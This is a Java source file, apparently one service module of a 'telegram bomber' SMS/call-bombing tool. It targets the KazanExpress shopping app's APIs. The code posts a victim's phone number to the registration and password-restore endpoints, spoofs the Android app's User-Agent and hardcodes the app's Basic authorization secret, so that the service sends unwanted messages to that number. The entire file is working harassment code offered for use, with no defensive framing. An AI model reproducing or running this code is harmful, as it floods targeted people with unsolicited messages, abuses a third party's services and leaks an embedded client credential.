package com.example.webapp.telegram.bomber.services;


import com.example.webapp.telegram.bomber.services.utils.Callback;
import com.example.webapp.telegram.bomber.services.utils.Service;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;

import okhttp3.Call;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;
import org.springframework.lang.NonNull;

public class KazanExpress extends Service {

    @Override
    public void run(OkHttpClient client, Callback callback) {
        JSONObject register = new JSONObject();

        try {
            register.put("phone", phone);
            register.put("platform", "ANDROID");
        } catch (JSONException e) {
            e.printStackTrace();
        }

        client.newCall(new Request.Builder()
                .url("https://api.kazanexpress.ru/api/v2/account/register/customer")
                .header("User-Agent", "KazanExpress/Android (com.kazanexpress.ke_app; 1.4.5)")
                .header("Authorization", "Basic a2F6YW5leHByZXNzLWFuZHJvaWQ6YW5kcm9pZFNlY3JldEtleQ==")
                .post(RequestBody.create(MediaType.parse("application/json"), register.toString()))
                .build()).enqueue(new okhttp3.Callback() {
            @Override
            public void onFailure(@NonNull Call call, @NonNull IOException e) {
                callback.onFailure(call, e);
            }

            @Override
            public void onResponse(@NonNull Call call, @NonNull Response response) {
                JSONObject login = new JSONObject();

                try {
                    login.put("login", getFormattedPhone());
                } catch (JSONException e) {
                    e.printStackTrace();
                }

                client.newCall(new Request.Builder()
                        .url("https://api.kazanexpress.ru/api/restore")
                        .header("User-Agent", "KazanExpress/Android (com.kazanexpress.ke_app; 1.4.5)")
                        .post(RequestBody.create(MediaType.parse("application/json"), login.toString()))
                        .build()).enqueue(callback);

                response.close();
            }
        });
    }
}
